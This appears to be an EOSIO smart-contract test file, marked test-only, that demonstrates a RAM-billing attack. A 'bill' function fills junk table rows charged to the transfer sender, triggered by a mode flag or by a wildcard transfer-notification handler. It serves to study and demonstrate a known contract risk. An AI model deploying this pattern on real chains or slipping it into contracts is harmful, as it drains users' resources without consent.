// TEST ONLY: demonstrate first-receiver authority/RAM risk, never production.
#include <eosio/eosio.hpp>
#include <eosio/asset.hpp>
#include <eosio/singleton.hpp>
using namespace eosio;
class [[eosio::contract("keyramattack")]] probe : public contract {
public:
 using contract::contract;
 struct [[eosio::table]] balance {asset quantity;uint64_t primary_key()const{return quantity.symbol.code().raw();}};
 struct [[eosio::table]] junk {uint64_t id;std::vector<char> data;uint64_t primary_key()const{return id;}};
 struct [[eosio::table("mode")]] mode {uint8_t value=0;};
 using balances=multi_index<"accounts"_n,balance>;
 using junk_table=multi_index<"junk"_n,junk>;
 using modes=singleton<"mode"_n,mode>;
 [[eosio::action]]void init(name vault){require_auth(get_self());balances t(get_self(),vault.value);t.emplace(get_self(),[&](auto&r){r.quantity=asset(1000000,symbol("XTK",4));});}
 [[eosio::action]]void setmode(uint8_t value){require_auth(get_self());modes(get_self(),get_self().value).set(mode{value},get_self());}
 void bill(name payer){junk_table t(get_self(),get_self().value);t.emplace(payer,[&](auto&r){r.id=t.available_primary_key();r.data=std::vector<char>(4096,'x');});}
 [[eosio::action]]void transfer(name from,name to,asset quantity,std::string memo){
  require_auth(from);check(is_account(to)&&quantity.amount>0,"invalid transfer");
  balances a(get_self(),from.value);auto it=a.require_find(quantity.symbol.code().raw(),"missing balance");check(it->quantity>=quantity,"balance");a.modify(it,same_payer,[&](auto&r){r.quantity-=quantity;});
  balances b(get_self(),to.value);auto dest=b.find(quantity.symbol.code().raw());if(dest==b.end())b.emplace(from,[&](auto&r){r.quantity=quantity;});else b.modify(dest,same_payer,[&](auto&r){r.quantity+=quantity;});
  if(modes(get_self(),get_self().value).get_or_default().value==1)bill(from);
  require_recipient(from);require_recipient(to);
 }
 [[eosio::on_notify("*::transfer")]]void notify(name from,name to,asset quantity,std::string memo){if(get_self()=="keyramnotify"_n&&to==get_self())bill(from);}
};
